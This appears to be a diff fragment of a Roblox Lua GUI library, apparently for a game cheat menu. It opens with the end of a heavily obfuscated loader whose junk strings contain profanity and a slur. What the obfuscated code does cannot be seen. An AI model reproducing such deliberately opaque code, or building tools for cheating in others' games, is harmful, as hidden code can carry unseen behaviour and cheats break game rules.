_ll=(1913814)while(0x419c/221)>=___ do _ll-= _ll _ll=(705435)while ___<=(-0x62+172)do _ll-= _ll local _ll;local ___;__[_[_lll]]=_l__[_[_l_ll]];_l=_l+__l;_=_l_[_l];___=_[____];_ll=__[_[___l]];__[___+1]=_ll;__[___]=_ll[_[_lll_]];_l=_l+__l;_=_l_[_l];__[_[__l_l]]=_[_ll_];_l=_l+__l;_=_l_[_l];__[_[__ll]]={};_l=_l+__l;_=_l_[_l];__[_[_lll]]=_l__[_[_ll_]];_l=_l+__l;_=_l_[_l];___=_[_lll];_ll=__[_[_ll_]];__[___+1]=_ll;__[___]=_ll[_[__ll_]];_l=_l+__l;_=_l_[_l];__[_[_lll]]=_[__l_];_l=_l+__l;_=_l_[_l];__[_[__ll]]={};_l=_l+__l;_=_l_[_l];__[_[____]]=_l__[_[_ll_]];_l=_l+__l;_=_l_[_l];__[_[____]]=_[__lll];break;end while 393==(_ll)/((-0x15+1816))do _ll=(484704)while ___>(270-((317+-0x6d)+-#[[sleep is nice]]))do _ll-= _ll local _ll=_[____];local _l_=__[_ll+2];local __l=__[_ll]+_l_;__[_ll]=__l;if(_l_>0)then if(__l<=__[_ll+1])then _l=_[___ll];__[_ll+3]=__l;end elseif(__l>=__[_ll+1])then _l=_[_ll_];__[_ll+3]=__l;end break end while(_ll)/((-#'This file has been disenchanted with grind stone, fuck the fuck off'+(0x177+-104)))==2376 do local _ll=_[__ll];local _l_=__[_ll+2];local __l=__[_ll]+_l_;__[_ll]=__l;if(_l_>0)then if(__l<=__[_ll+1])then _l=_[__lll];__[_ll+3]=__l;end elseif(__l>=__[_ll+1])then _l=_[__lll];__[_ll+3]=__l;end break end;break;end break;end while 747==(_ll)/((0x370b0/88))do _ll=(172560)while(-#"Moonsec V2 deobfuscation in process"+(0x151-225))>=___ do _ll-= _ll local _ll;__[_[_ll_l]]=__[_[_ll_]][_[___l_]];_l=_l+__l;_=_l_[_l];__[_[_llll]]=_l__[_[__lll]];_l=_l+__l;_=_l_[_l];__[_[__l_l]]=_l__[_[_l_ll]];_l=_l+__l;_=_l_[_l];__[_[_lll]]=__[_[___l]][_[_l_l_]];_l=_l+__l;_=_l_[_l];_ll=_[_llll]__[_ll]=__[_ll](____l(__,_ll+__l,_[_l_ll]))_l=_l+__l;_=_l_[_l];__[_[_lll]]=_l__[_[___l]];_l=_l+__l;_=_l_[_l];__[_[_llll]]=__[_[_ll_]][_[__l__]];_l=_l+__l;_=_l_[_l];__[_[_ll_l]]=__[_[_ll_]][_[___l_]];_l=_l+__l;_=_l_[_l];_ll=_[__l_l]__[_ll](__[_ll+_l_l])_l=_l+__l;_=_l_[_l];do return __[_[____]]end break;end while 60==(_ll)/((0x1693-2903))do _ll=(404085)while ___>(219-0x8d)do _ll-= _ll if(__[_[__ll]]==__[_[___l_]])then _l=_l+_l_l;else _l=_[__l_];end;break end while 2607==(_ll)/((7285/0x2f))do __[_[____]]=__[_[__l_]]-__[_[_l_l_]];break end;break;end break;end break;end break;end while(_ll)/((-68+0x18a))==2525 do _ll=(12026832)while ___<=(0x83+-46)do _ll-= _ll _ll=(905184)while ___<=(8364/0x66)do _ll-= _ll _ll=(252240)while(-#'This file has been enchanted with uncrackable V, fuck the fuck off'+(18980/0x82))>=___ do _ll-= _ll __[_[_lll]]=_l__[_[__l_]];break;end while(_ll)/((-#[[hi skid]]+(0x53520/108)))==80 do _ll=(8172447)while(281-0xc8)<___ do _ll-= _ll local _lll;local ___;local _ll;__[_[__l_l]]=_l__[_[_l_ll]];_l=_l+__l;_=_l_[_l];_ll=_[_ll_l];___=__[_[_ll_]];__[_ll+1]=___;__[_ll]=___[_[__l__]];_l=_l+__l;_=_l_[_l];__[_[_llll]]=_[___ll];_l=_l+__l;_=_l_[_l];_ll=_[_llll]__[_ll]=__[_ll](____l(__,_ll+__l,_[__lll]))_l=_l+__l;_=_l_[_l];__[_[__l_l]][_[__l_]]=__[_[__l__]];_l=_l+__l;_=_l_[_l];_ll=_[____];_lll=__[_ll];for _=_ll+1,_[_ll_]do _ll_ll(_lll,__[_])end;break end while 3359==(_ll)/((((-0x2e+569396)+-#'splooshy fucked his own hand')/0xea))do local _l=_[__l_l];local _ll=__[_l];for _=_l+1,_[__l_]do _ll_ll(_ll,__[_])end;break end;break;end break;end while(_ll)/((-91+0x3dd))==1008 do _ll=(9250326)while ___<=(0x11d5/55)do _ll-= _ll __[_[__ll]]=__[_[_l_ll]][__[_[_lll_]]];break;end while(_ll)/((0xa1fc/14))==3123 do _ll=(5220272)while(-#'troll the teibal'+(0xd5+-113))<___ do _ll-= _ll __[_[____]]=(_[__l_]~=0);_l=_l+_l_l;break end while(_ll)/((0xbfb-((0xc8a-1620)+-#[[give access to functions for boosters]])))==3448 do if(__[_[__ll]]~=__[_[_lll_]])then _l=_l+_l_l;else _l=_[___ll];end;break end;break;end break;end break;end while(_ll)/((-#'im gonna shit yourself'+(781220/0xdc)))==3408 do _ll=(14621751)while(0x11e-198)>=___ do _ll-= _ll _ll=(7030295)while ___<=(0x10a-((0xd2+-17)+-#[[sleep is nice]]))do _ll-= _ll _l=_[__l_];break;end while 2599==(_ll)/((0x154c-2747))do _ll=(1822744)while ___>(181+-0x5e)do _ll-= _ll __[_[_lll]]=#__[_[___l]];break end while(_ll)/(((0x1dc0-3841)+-#"im living"))==484 do local _=_[__ll]__[_](__[_+_l_l])break end;break;end break;end while(_ll)/((-127+0xf4c))==3859 do _ll=(660765)while ___<=(-#[[This file has been enchanted with uncrackable V, fuck the fuck off]]+(0x6653/169))do _ll-= _ll local _ll;__[_[____]]=_l__[_[___ll]];_l=_l+__l;_=_l_[_l];__[_[_ll_l]]=__[_[__l_]][_[_ll__]];_l=_l+__l;_=_l_[_l];__[_[____]]=_[_l_ll];_l=_l+__l;_=_l_[_l];__[_[_llll]]=_[___l];_l=_l+__l;_=_l_[_l];__[_[_lll]]=_[__lll];_l=_l+__l;_=_l_[_l];__[_[_ll_l]]=_[__lll];_l=_l+__l;_=_l_[_l];_ll=_[_llll]__[_ll]=__[_ll](____l(__,_ll+__l,_[_l_ll]))_l=_l+__l;_=_l_[_l];__[_[_lll]][_[_l_ll]]=__[_[__ll_]];_l=_l+__l;_=_l_[_l];__[_[_lll]][_[__lll]]=_[__ll_];_l=_l+__l;_=_l_[_l];__[_[_lll]][_[__l_]]=_[_lll_];break;end while 2697==(_ll)/((59780/0xf4))do _ll=(5463094)while ___>((30960/0xf0)+-#'I have 0x in my nickname and I am cool.')do _ll-= _ll local _ll;_l__[_[_l_ll]]=__[_[____]];_l=_l+__l;_=_l_[_l];__[_[_lll]]={};_l=_l+__l;_=_l_[_l];__[_[__ll]]=_l__[_[_l_ll]];_l=_l+__l;_=_l_[_l];__[_[_llll]]=_[___l];_l=_l+__l;_=_l_[_l];__[_[_ll_l]]=_[___l];_l=_l+__l;_=_l_[_l];__[_[_lll]]=_[_ll_];_l=_l+__l;_=_l_[_l];_ll=_[_llll]__[_ll]=__[_ll](____l(__,_ll+__l,_[_ll_]))_l=_l+__l;_=_l_[_l];__[_[__ll]][__[_[_l_ll]]]=_[___l_];_l=_l+__l;_=_l_[_l];__[_[____]]=_l__[_[__l_]];_l=_l+__l;_=_l_[_l];__[_[_ll_l]]=_[___l];_l=_l+__l;_=_l_[_l];__[_[__l_l]]=_[_ll_];_l=_l+__l;_=_l_[_l];__[_[_llll]]=_[___l];_l=_l+__l;_=_l_[_l];_ll=_[_llll]__[_ll]=__[_ll](____l(__,_ll+__l,_[__l_]))_l=_l+__l;_=_l_[_l];__[_[_lll]]={};_l=_l+__l;_=_l_[_l];__[_[____]]={};_l=_l+__l;_=_l_[_l];__[_[_lll]]=_l__[_[_ll_]];_l=_l+__l;_=_l_[_l];__[_[__ll]]=_[_ll_];_l=_l+__l;_=_l_[_l];__[_[_lll]]=_[___l];_l=_l+__l;_=_l_[_l];__[_[____]]=_[__lll];_l=_l+__l;_=_l_[_l];_ll=_[_lll]__[_ll]=__[_ll](____l(__,_ll+__l,_[___ll]))_l=_l+__l;_=_l_[_l];__[_[__l_l]]=_l__[_[___l]];_l=_l+__l;_=_l_[_l];__[_[____]]=_[___ll];_l=_l+__l;_=_l_[_l];__[_[__ll]]=_[__l_];_l=_l+__l;_=_l_[_l];__[_[__l_l]]=_[__lll];_l=_l+__l;_=_l_[_l];_ll=_[_llll]__[_ll]=__[_ll](____l(__,_ll+__l,_[___ll]))_l=_l+__l;_=_l_[_l];__[_[__l_l]][__[_[__lll]]]=__[_[_l_l_]];_l=_l+__l;_=_l_[_l];__[_[__l_l]]=_l__[_[___l]];_l=_l+__l;_=_l_[_l];__[_[_llll]]=_[___ll];_l=_l+__l;_=_l_[_l];__[_[__ll]]=_[___l];_l=_l+__l;_=_l_[_l];__[_[_ll_l]]=_[___l];_l=_l+__l;_=_l_[_l];_ll=_[__ll]__[_ll]=__[_ll](____l(__,_ll+__l,_[__l_]))_l=_l+__l;_=_l_[_l];__[_[____]]=_l__[_[__lll]];_l=_l+__l;_=_l_[_l];__[_[_ll_l]]=_[__l_];_l=_l+__l;_=_l_[_l];__[_[_ll_l]]=_[___l];_l=_l+__l;_=_l_[_l];__[_[__ll]]=_[_l_ll];_l=_l+__l;_=_l_[_l];_ll=_[_lll]__[_ll]=__[_ll](____l(__,_ll+__l,_[___l]))_l=_l+__l;_=_l_[_l];__[_[_llll]][__[_[_l_ll]]]=__[_[_l_l_]];_l=_l+__l;_=_l_[_l];__[_[__ll]]=_l__[_[__l_]];_l=_l+__l;_=_l_[_l];__[_[_lll]]=_[___l];_l=_l+__l;_=_l_[_l];__[_[_llll]]=_[___ll];_l=_l+__l;_=_l_[_l];__[_[_llll]]=_[___ll];_l=_l+__l;_=_l_[_l];_ll=_[_ll_l]__[_ll]=__[_ll](____l(__,_ll+__l,_[_l_ll]))_l=_l+__l;_=_l_[_l];__[_[____]]=_l__[_[_l_ll]];_l=_l+__l;_=_l_[_l];__[_[__ll]]=_[_l_ll];_l=_l+__l;_=_l_[_l];__[_[____]]=_[__l_];_l=_l+__l;_=_l_[_l];__[_[_llll]]=_[_l_ll];_l=_l+__l;_=_l_[_l];_ll=_[_lll]__[_ll]=__[_ll](____l(__,_ll+__l,_[__l_]))_l=_l+__l;_=_l_[_l];__[_[_llll]][__[_[_l_ll]]]=__[_[_l_l_]];_l=_l+__l;_=_l_[_l];__[_[_llll]]=_l__[_[___l]];_l=_l+__l;_=_l_[_l];__[_[_lll]]=_[_l_ll];_l=_l+__l;_=_l_[_l];__[_[__ll]]=_[_l_ll];_l=_l+__l;_=_l_[_l];__[_[__ll]]=_[_ll_];_l=_l+__l;_=_l_[_l];_ll=_[__l_l]__[_ll]=__[_ll](____l(__,_ll+__l,_[___l]))_l=_l+__l;_=_l_[_l];__[_[_lll]]=_l__[_[___l]];_l=_l+__l;_=_l_[_l];__[_[__ll]]=_[__l_];_l=_l+__l;_=_l_[_l];_ll=_[____]__[_ll]=__[_ll](__[_ll+_l_l])_l=_l+__l;_=_l_[_l];__[_[____]][__[_[_ll_]]]=__[_[_ll__]];_l=_l+__l;_=_l_[_l];__[_[__ll]]=_l__[_[___ll]];_l=_l+__l;_=_l_[_l];__[_[__l_l]]=_[___l];_l=_l+__l;_=_l_[_l];__[_[_ll_l]]=_[__l_];_l=_l+__l;_=_l_[_l];__[_[_llll]]=_[_l_ll];_l=_l+__l;_=_l_[_l];_ll=_[_ll_l]__[_ll]=__[_ll](____l(__,_ll+__l,_[___ll]))_l=_l+__l;_=_l_[_l];__[_[__ll]]={};_l=_l+__l;_=_l_[_l];__[_[____]]={};_l=_l+__l;_=_l_[_l];__[_[_llll]]=_l__[_[___ll]];_l=_l+__l;_=_l_[_l];__[_[_llll]]=_[_ll_];_l=_l+__l;_=_l_[_l];__[_[__ll]]=_[__lll];_l=_l+__l;_=_l_[_l];__[_[_lll]]=_[___ll];_l=_l+__l;_=_l_[_l];_ll=_[_lll]__[_ll]=__[_ll](____l(__,_ll+__l,_[_l_ll]))_l=_l+__l;_=_l_[_l];__[_[_ll_l]]=_l__[_[__lll]];_l=_l+__l;_=_l_[_l];__[_[__ll]]=_[___ll];_l=_l+__l;_=_l_[_l];__[_[_llll]]=_[___ll];_l=_l+__l;_=_l_[_l];__[_[_ll_l]]=_[___ll];_l=_l+__l;_=_l_[_l];_ll=_[_lll]__[_ll]=__[_ll](____l(__,_ll+__l,_[___ll]))_l=_l+__l;_=_l_[_l];__[_[_lll]][__[_[___ll]]]=__[_[__l__]];_l=_l+__l;_=_l_[_l];__[_[__l_l]]=_l__[_[_ll_]];_l=_l+__l;_=_l_[_l];__[_[____]]=_[_ll_];_l=_l+__l;_=_l_[_l];__[_[_ll_l]]=_[___ll];_l=_l+__l;_=_l_[_l];__[_[_llll]]=_[__l_];_l=_l+__l;_=_l_[_l];_ll=_[_lll]__[_ll]=__[_ll](____l(__,_ll+__l,_[__l_]))break end while 2366==(_ll)/(((0x987+-82)+-#[[ill fard poo if federal deletes my strings black]]))do do return __[_[_ll_l]]end break end;break;end break;end break;end break;end break;end break;end _l+= _l_l end;end);end;return _lllll(__l_ll(),{},_l___l())()end)_msec({[(-#"sussy amogus"+(-0x42+237))]='\115\116'..(function(_)return(_ and'((0x114+-110)+-#\'this message was written on the 4th of August, 2021 at 4:50 PM GMT\')')or'\114\105'or'\120\58'end)((0x73+(-0x5d+-17))==(-120+0x7e))..'\110g',[(727+-#{(function()return{','}end)();1,(function()return#{('hPOkLL'):find("\79")}>0 and 1 or 0 end)})]='\108\100'..(function(_)return(_ and'(0x133-207)')or'\101\120'or'\119\111'end)((-#"do while true do end end"+(2610/0x5a))==((139-0x55)+-#"perth thinks psu is bad (it is) and uses ms priv"))..'\112',[(0x2274/30)]=(function(_)return(_ and'(-0x79+221)')and'\98\121'or'\100\120'end)((0x48-67)==((((-0x1ea4/106)+-#'Do you even know what sizeof size_t equals to Lmao')+0xc0)+-#[[Nah the only nerve you can hit is a data breach and source leak]]))..'\116\101',[((389+-0x20)+-#[[HEY NO FAIR]])]='\99'..(function(_)return(_ and'(-#"Penis Sucking Utilities source leak lol!!"+((0x193-262)/0x1))')and'\90\19\157'or'\104\97'end)((27-0x16)==(0x31-46))..'\114',[((-0x5a+1316)-676)]='\116\97'..(function(_)return(_ and'(-0x7f+227)')and'\64\113'or'\98\108'end)((-#[[helloretard vs MoonSec who will win]]+(4674/0x72))==(30/0x6))..'\101',[(-#'a table b equals c'+(101907/0xc9))]=(function(_)return(_ and'(327-0xe3)')or'\115\117'or'\78\107'end)((-#[[This file has been enchanted with uncrackable V, fuck the fuck off]]+(225-0x9c))==(178-0x93))..'\98',[(0x742-991)]='\99\111'..(function(_)return(_ and'(290-0xbe)')and'\110\99'or'\110\105\103\97'end)(((0x3aa7/231)+-#"me when your girl and im shirtless")==(84-0x35))..'\97\116',[(14806/0x16)]=(function(_,_l)return(_ and'(6400/0x40)')and'\48\159\158\188\10'or'\109\97'end)((1035/0xcf)==(-#[[<@!519139355118534656> stop with the cap ms v3 got my script 30.0 ms]]+(0x2ac8/(0x13f-171))))..'\116\104',[(0xb11-1466)]=(function(_l,_)return((0x22-29)==(-#'i love wally'+(0x8a-123))and'\48'..'\195'or _l..((not'\20\95\69'and'\90'..'\180'or _)))or'\199\203\95'end),[((232317/0xf9)+-#"v3 has it")]='\105\110'..(function(_,_l)return(_ and'(0xdf-123)')and'\90\115\138\115\15'or'\115\101'end)(((2937/0x59)+-#"splooshy fucked his own hand")==(4340/0x8c))..'\114\116',[(-0x7b+1147)]='\117\110'..(function(_,_l)return(_ and'((0x3072/117)+-#"Unpair")')or'\112\97'or'\20\38\154'end)((0x1a4/84)==((6024-0xbe8)/96))..'\99\107',[(1187+-#{74;1;",",{}})]='\115\101'..(function(_)return(_ and'(19600/0xc4)')and'\110\112\99\104'or'\108\101'end)((-#[[Pain is an illusion created by your brain]]+(1334/0x1d))==((0xb5-125)+-#[[Federla is good at coding]]))..'\99\116',[(-#{(function()return#{('kLLhff'):find("\76")}>0 and 1 or 0 end);(function()return{','}end)(),{};'}',(function()return{','}end)();(function()return#{('kLLhff'):find("\76")}>0 and 1 or 0 end),(function()return#{('kLLhff'):find("\76")}>0 and 1 or 0 end)}+1265)]='\116\111\110'..(function(_,_l)return(_ and'(0xee-(-#\'turn around and dont you think about coming back here\'+(-82+0x111)))')and'\117\109\98'or'\100\97\120\122'end)((-0x12+23)==(830/0xa6))..'\101\114'},{[(5512/0x68)]=((getfenv))},((getfenv))()) end)()
-
-
-
-    end
-    
-    default = {
-        topcolor       = Color3.fromRGB(30, 30, 30);
-        titlecolor     = Color3.fromRGB(255, 255, 255);
-        
-        underlinecolor = Color3.fromRGB(0, 255, 140);
-        bgcolor        = Color3.fromRGB(35, 35, 35);
-        boxcolor       = Color3.fromRGB(35, 35, 35);
-        btncolor       = Color3.fromRGB(25, 25, 25);
-        dropcolor      = Color3.fromRGB(25, 25, 25);
-        sectncolor     = Color3.fromRGB(25, 25, 25);
-        bordercolor    = Color3.fromRGB(60, 60, 60);
-
-        font           = Enum.Font.SourceSans;
-        titlefont      = Enum.Font.Code;
-
-        fontsize       = 17;
-        titlesize      = 18;
-
-        textstroke     = 1;
-        titlestroke    = 1;
-
-        strokecolor    = Color3.fromRGB(0, 0, 0);
-
-        textcolor      = Color3.fromRGB(255, 255, 255);
-        titletextcolor = Color3.fromRGB(255, 255, 255);
-
-        placeholdercolor = Color3.fromRGB(255, 255, 255);
-        titlestrokecolor = Color3.fromRGB(0, 0, 0);
-    }
-
-    library.options = setmetatable({}, {__index = default})
-
-    spawn(function()
-        while true do
-            for i=0, 1, 1 / 300 do              
-                for _, obj in next, library.rainbowtable do
-                    obj.BackgroundColor3 = Color3.fromHSV(i, 1, 1);
-                end
-                wait()
-            end;
-        end
-    end)
-
-    local function isreallypressed(bind, inp)
-        local key = bind
-        if typeof(key) == "Instance" then
-            if key.UserInputType == Enum.UserInputType.Keyboard and inp.KeyCode == key.KeyCode then
-                return true;
-            elseif tostring(key.UserInputType):find('MouseButton') and inp.UserInputType == key.UserInputType then
-                return true
-            end
-        end
-        if tostring(key):find'MouseButton1' then
-            return key == inp.UserInputType
-        else
-            return key == inp.KeyCode
-        end
-    end
-
-    game:GetService("UserInputService").InputBegan:connect(function(input)
-        if (not library.binding) then
-            for idx, binds in next, library.binds do
-                local real_binding = binds.location[idx];
-                if real_binding and isreallypressed(real_binding, input) then
-                    binds.callback()
-                end
-            end
-        end
-    end)
+	local dragger = {}; do
+		local mouse        = game:GetService("Players").LocalPlayer:GetMouse();
+		local inputService = game:GetService('UserInputService');
+		local heartbeat    = game:GetService("RunService").Heartbeat;
+		-- // credits to Ririchi / Inori for this cute drag function :)
+		function dragger.new(frame)
+			local s, event = pcall(function()
+				return frame.MouseEnter
+			end)
+
+			if s then
+				frame.Active = true;
+
+				event:connect(function()
+					local input = frame.InputBegan:connect(function(key)
+						if key.UserInputType == Enum.UserInputType.MouseButton1 then
+							local objectPosition = Vector2.new(mouse.X - frame.AbsolutePosition.X, mouse.Y - frame.AbsolutePosition.Y);
+							while heartbeat:wait() and inputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) do
+								pcall(function()
+									frame:TweenPosition(UDim2.new(0, mouse.X - objectPosition.X + (frame.Size.X.Offset * frame.AnchorPoint.X), 0, mouse.Y - objectPosition.Y + (frame.Size.Y.Offset * frame.AnchorPoint.Y)), 'Out', 'Linear', 0.1, true);
+								end)
+							end
+						end
+					end)
+
+					local leave;
+					leave = frame.MouseLeave:connect(function()
+						input:disconnect();
+						leave:disconnect();
+					end)
+				end)
+			end
+		end
+
+		game:GetService('UserInputService').InputBegan:connect(function(key, gpe)
+			if (not gpe) then
+				if key.KeyCode == Enum.KeyCode.RightControl then
+					library.toggled = not library.toggled;
+					for i, data in next, library.queue do
+						local pos = (library.toggled and data.p or UDim2.new(-1, 0, -0.5,0))
+						data.w:TweenPosition(pos, (library.toggled and 'Out' or 'In'), 'Quad', 0.15, true)
+						wait();
+					end
+				end
+			end
+		end)
+	end
+
+	local types = {}; do
+		types.__index = types;
+		function types.window(name, options)
+			library.count = library.count + 1
+			local newWindow = library:Create('Frame', {
+				Name = name;
+				Size = UDim2.new(0, 190, 0, 30);
+				BackgroundColor3 = options.topcolor;
+				BorderSizePixel = 0;
+				Parent = library.container;
+				Position = UDim2.new(0, (15 + (200 * library.count) - 200), 0, 0);
+				ZIndex = 3;
+				library:Create('TextLabel', {
+					Text = name;
+					Size = UDim2.new(1, -10, 1, 0);
+					Position = UDim2.new(0, 5, 0, 0);
+					BackgroundTransparency = 1;
+					Font = Enum.Font.Code;
+					TextSize = options.titlesize;
+					Font = options.titlefont;
+					TextColor3 = options.titletextcolor;
+					TextStrokeTransparency = library.options.titlestroke;
+					TextStrokeColor3 = library.options.titlestrokecolor;
+					ZIndex = 3;
+				});
+				library:Create("TextButton", {
+					Size = UDim2.new(0, 30, 0, 30);
+					Position = UDim2.new(1, -35, 0, 0);
+					BackgroundTransparency = 1;
+					Text = "-";
+					TextSize = options.titlesize;
+					Font = options.titlefont;--Enum.Font.Code;
+					Name = 'window_toggle';
+					TextColor3 = options.titletextcolor;
+					TextStrokeTransparency = library.options.titlestroke;
+					TextStrokeColor3 = library.options.titlestrokecolor;
+					ZIndex = 3;
+				});
+				library:Create("Frame", {
+					Name = 'Underline';
+					Size = UDim2.new(1, 0, 0, 2);
+					Position = UDim2.new(0, 0, 1, -2);
+					BackgroundColor3 = (options.underlinecolor ~= "rainbow" and options.underlinecolor or Color3.new());
+					BorderSizePixel = 0;
+					ZIndex = 3;
+				});
+				library:Create('Frame', {
+					Name = 'container';
+					Position = UDim2.new(0, 0, 1, 0);
+					Size = UDim2.new(1, 0, 0, 0);
+					BorderSizePixel = 0;
+					BackgroundColor3 = options.bgcolor;
+					ClipsDescendants = false;
+					library:Create('UIListLayout', {
+						Name = 'List';
+						SortOrder = Enum.SortOrder.LayoutOrder;
+					})
+				});
+			})
+
+			if options.underlinecolor == "rainbow" then
+				table.insert(library.rainbowtable, newWindow:FindFirstChild('Underline'))
+			end
+
+			local window = setmetatable({
+				count = 0;
+				object = newWindow;
+				container = newWindow.container;
+				toggled = true;
+				flags   = {};
+
+			}, types)
+
+			table.insert(library.queue, {
+				w = window.object;
+				p = window.object.Position;
+			})
+
+			newWindow:FindFirstChild("window_toggle").MouseButton1Click:connect(function()
+				window.toggled = not window.toggled;
+				newWindow:FindFirstChild("window_toggle").Text = (window.toggled and "+" or "-")
+				if (not window.toggled) then
+					window.container.ClipsDescendants = true;
+				end
+				wait();
+				local y = 0;
+				for i, v in next, window.container:GetChildren() do
+					if (not v:IsA('UIListLayout')) then
+						y = y + v.AbsoluteSize.Y;
+					end
+				end 
+
+				local targetSize = window.toggled and UDim2.new(1, 0, 0, y+5) or UDim2.new(1, 0, 0, 0);
+				local targetDirection = window.toggled and "In" or "Out"
+
+				window.container:TweenSize(targetSize, targetDirection, "Quad", 0.15, true)
+				wait(.15)
+				if window.toggled then
+					window.container.ClipsDescendants = false;
+				end
+			end)
+
+			return window;
+		end
+
+		function types:Resize()
+			local y = 0;
+			for i, v in next, self.container:GetChildren() do
+				if (not v:IsA('UIListLayout')) then
+					y = y + v.AbsoluteSize.Y;
+				end
+			end 
+			self.container.Size = UDim2.new(1, 0, 0, y+5)
+		end
+
+		function types:GetOrder() 
+			local c = 0;
+			for i, v in next, self.container:GetChildren() do
+				if (not v:IsA('UIListLayout')) then
+					c = c + 1
+				end
+			end
+			return c
+		end
+
+		function types:Label(text)
+			local v = game:GetService'TextService':GetTextSize(text, 18, Enum.Font.SourceSans, Vector2.new(math.huge, math.huge))
+			local object = library:Create('Frame', {
+				Size = UDim2.new(1, 0, 0, v.Y + 5);
+				BackgroundTransparency  = 1;
+				library:Create('TextLabel', {
+					Size = UDim2.new(1, 0, 1, 0);
+					Position = UDim2.new(0, 10, 0, 0);
+					LayoutOrder = self:GetOrder();
+
+					Text = text;
+					TextSize = 18;
+					Font = Enum.Font.SourceSans;
+					TextColor3 = Color3.fromRGB(255, 255, 255);
+					BackgroundTransparency = 1;
+					TextXAlignment = Enum.TextXAlignment.Left;
+					TextWrapped = true;
+				});
+				Parent = self.container
+			})
+			self:Resize();
+		end
+
+		function types:Toggle(name, options, callback)
+			local default  = options.default or false;
+			local location = options.location or self.flags;
+			local flag     = options.flag or "";
+			local callback = callback or function() end;
+
+			location[flag] = default;
+
+			local check = library:Create('Frame', {
+				BackgroundTransparency = 1;
+				Size = UDim2.new(1, 0, 0, 25);
+				LayoutOrder = self:GetOrder();
+				library:Create('TextLabel', {
+					Name = name;
+					Text = "\r" .. name;
+					BackgroundTransparency = 1;
+					TextColor3 = library.options.textcolor;
+					Position = UDim2.new(0, 5, 0, 0);
+					Size     = UDim2.new(1, -5, 1, 0);
+					TextXAlignment = Enum.TextXAlignment.Left;
+					Font = library.options.font;
+					TextSize = library.options.fontsize;
+					TextStrokeTransparency = library.options.textstroke;
+					TextStrokeColor3 = library.options.strokecolor;
+					library:Create('TextButton', {
+						Text = (location[flag] and utf8.char(10003) or "");
+						Font = library.options.font;
+						TextSize = library.options.fontsize;
+						Name = 'Checkmark';
+						Size = UDim2.new(0, 20, 0, 20);
+						Position = UDim2.new(1, -25, 0, 4);
+						TextColor3 = library.options.textcolor;
+						BackgroundColor3 = library.options.bgcolor;
+						BorderColor3 = library.options.bordercolor;
+						TextStrokeTransparency = library.options.textstroke;
+						TextStrokeColor3 = library.options.strokecolor;
+					})
+				});
+				Parent = self.container;
+			});
+
+			local function click(t)
+				location[flag] = not location[flag];
+				check:FindFirstChild(name).Checkmark.Text = location[flag] and utf8.char(10003) or "";
+				callback(location[flag])
+			end
+
+			check:FindFirstChild(name).Checkmark.MouseButton1Click:connect(click)
+			library.callbacks[flag] = click;
+
+			if location[flag] == true then
+				callback(location[flag])
+			end
+
+			self:Resize();
+			return {
+				Set = function(self, b)
+					location[flag] = b;
+					callback(location[flag])
+					check:FindFirstChild(name).Checkmark.Text = location[flag] and utf8.char(10003) or "";
+				end
+			}
+		end
+
+		function types:Button(name, callback)
+			callback = callback or function() end;
+
+			local check = library:Create('Frame', {
+				BackgroundTransparency = 1;
+				Size = UDim2.new(1, 0, 0, 25);
+				LayoutOrder = self:GetOrder();
+				library:Create('TextButton', {
+					Name = name;
+					Text = name;
+					BackgroundColor3 = library.options.btncolor;
+					BorderColor3 = library.options.bordercolor;
+					TextStrokeTransparency = library.options.textstroke;
+					TextStrokeColor3 = library.options.strokecolor;
+					TextColor3 = library.options.textcolor;
+					Position = UDim2.new(0, 5, 0, 5);
+					Size     = UDim2.new(1, -10, 0, 20);
+					Font = library.options.font;
+					TextSize = library.options.fontsize;
+				});
+				Parent = self.container;
+			});
+
+			check:FindFirstChild(name).MouseButton1Click:connect(callback)
+			self:Resize();
+
+			return {
+				Fire = function()
+					callback();
+				end
+			}
+		end
+
+		function types:Box(name, options, callback) --type, default, data, location, flag)
+			local type   = options.type or "";
+			local default = options.default or "";
+			local data = options.data
+			local location = options.location or self.flags;
+			local flag     = options.flag or "";
+			local callback = callback or function() end;
+			local min      = options.min or 0;
+			local max      = options.max or 9e9;
+
+			if type == 'number' and (not tonumber(default)) then
+				location[flag] = default;
+			else
+				location[flag] = "";
+				default = "";
+			end
+
+			local check = library:Create('Frame', {
+				BackgroundTransparency = 1;
+				Size = UDim2.new(1, 0, 0, 25);
+				LayoutOrder = self:GetOrder();
+				library:Create('TextLabel', {
+					Name = name;
+					Text = "\r" .. name;
+					BackgroundTransparency = 1;
+					TextColor3 = library.options.textcolor;
+					TextStrokeTransparency = library.options.textstroke;
+					TextStrokeColor3 = library.options.strokecolor;
+					Position = UDim2.new(0, 5, 0, 0);
+					Size     = UDim2.new(1, -5, 1, 0);
+					TextXAlignment = Enum.TextXAlignment.Left;
+					Font = library.options.font;
+					TextSize = library.options.fontsize;
+					library:Create('TextBox', {
+						TextStrokeTransparency = library.options.textstroke;
+						TextStrokeColor3 = library.options.strokecolor;
+						Text = tostring(default);
+						Font = library.options.font;
+						TextSize = library.options.fontsize;
+						Name = 'Box';
+						Size = UDim2.new(0, 60, 0, 20);
+						Position = UDim2.new(1, -65, 0, 3);
+						TextColor3 = library.options.textcolor;
+						BackgroundColor3 = library.options.boxcolor;
+						BorderColor3 = library.options.bordercolor;
+						PlaceholderColor3 = library.options.placeholdercolor;
+					})
+				});
+				Parent = self.container;
+			});
+
+			local box = check:FindFirstChild(name):FindFirstChild('Box');
+			box.FocusLost:connect(function(e)
+				local old = location[flag];
+				if type == "number" then
+					local num = tonumber(box.Text)
+					if (not num) then
+						box.Text = tonumber(location[flag])
+					else
+						location[flag] = math.clamp(num, min, max)
+						box.Text = tonumber(location[flag])
+					end
+				else
+					location[flag] = tostring(box.Text)
+				end
+
+				callback(location[flag], old, e)
+			end)
+
+			if type == 'number' then
+				box:GetPropertyChangedSignal('Text'):connect(function()
+					box.Text = string.gsub(box.Text, "[%a+]", "");
+				end)
+			end
+
+			self:Resize();
+			return box
+		end
+
+		function types:Bind(name, options, callback)
+			local location     = options.location or self.flags;
+			local keyboardOnly = options.kbonly or false
+			local flag         = options.flag or "";
+			local callback     = callback or function() end;
+			local default      = options.default;
+
+			if keyboardOnly and (not tostring(default):find('MouseButton')) then
+				location[flag] = default
+			end
+
+			local banned = {
+				Return = true;
+				Space = true;
+				Tab = true;
+				Unknown = true;
+			}
+
+			local shortNames = {
+				RightControl = 'RightCtrl';
+				LeftControl = 'LeftCtrl';
+				LeftShift = 'LShift';
+				RightShift = 'RShift';
+				MouseButton1 = "Mouse1";
+				MouseButton2 = "Mouse2";
+			}
+
+			local allowed = {
+				MouseButton1 = true;
